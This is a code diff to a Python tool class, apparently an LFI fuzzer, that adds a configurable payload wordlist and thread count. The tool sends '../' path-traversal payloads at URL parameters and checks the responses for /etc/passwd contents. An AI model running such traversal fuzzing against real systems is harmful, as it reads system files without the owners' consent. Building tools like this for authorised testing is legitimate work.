@@ -22,10 +22,12 @@ class AnonLFI:
         self.depth = depth
         self.param_name = None
         self.silent = silent
+        self.wordlist = None
+        self.threads = 50
         self.LFI_TEST_FILES = [
             # Example of potential files to test for LFI (uncomment if needed)
             # ('/etc/passwd', re.compile(r'root:(.*):\d+:\d+:')),
-            # ('/Windows/System32/drivers/etc/hosts', re.compile(r'127\.0\.0\.1\s+localhost'))
+            # ('/Windows/System32/drivers/etc/hosts', re.compile(r'127\\.0\\.0\\.1\\s+localhost'))
         ]
         self.LFI_PAYLOADS = [
             '../',  # Original
@@ -63,15 +65,16 @@ class AnonLFI:
                 file_paths.append((payload * 10 + file_path, _))
                 file_paths.append((urllib.parse.quote(payload * 10 + file_path), _))
 
-        # Load custom payloads if necessary
+        # Load custom payloads if provided, otherwise default to large_payloads.txt
+        payload_file = self.wordlist or 'payloads/large_payloads.txt'
         try:
-            with open('payloads/large_payloads.txt', 'r') as f:
+            with open(payload_file, 'r') as f:
                 for line in f:
                     stripped_line = line.strip()
                     if stripped_line:
                         file_paths.append((stripped_line, None))
         except FileNotFoundError:
-            logging.warning("Custom payload file 'payloads/large_payloads.txt' not found, proceeding with default payloads.")
+            logging.warning(f"Custom payload file '{payload_file}' not found, proceeding with default payloads.")
 
         console = Console()
         total_operations = len(params.keys()) * len(file_paths)
@@ -119,7 +122,7 @@ class AnonLFI:
                 lfi_detected = False
                 if file_regex and file_regex.search(response_text):
                     if not self.silent:
-                        console.print(f"[bold green]Possible LFI detected at {fuzzed_url}\nResponse length: {response_length}\nStatus code: {response.status_code}[/bold green]", style='bold green')
+                        console.print(f"[bold green]Possible LFI detected at {fuzzed_url}\nResponse length: {response_length}\nStatus code: {response.status_code}[/bold green]")
                     lfi_detected = True
                     self.param_name = param_name
 
@@ -130,7 +133,7 @@ class AnonLFI:
                 # Detect if response length is an outlier
                 if abs(response_length - avg) > 2.5 * stddev and response.status_code < 400 and not response.history:
                     if not self.silent:
-                        console.print(f"[bold red]{fuzzed_url}[/bold red] - Length: [red]{response_length}[/red], Status code: [red]{response.status_code}[/red]", style='bold green')
+                        console.print(f"[bold red]{fuzzed_url}[/bold red] - Length: [red]{response_length}[/red], Status code: [red]{response.status_code}[/red]")
                     lfi_detected = True
                     self.param_name = param_name
 
@@ -147,7 +150,7 @@ class AnonLFI:
             if progress:
                 progress.update(task, advance=1)
 
-        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
             futures = []
             for file_path, file_regex in file_paths:
                 for param_name in params.keys():
@@ -157,4 +160,3 @@ class AnonLFI:
                 future.result()
 
         return any(result for result, _ in shared_results), self.param_name
-
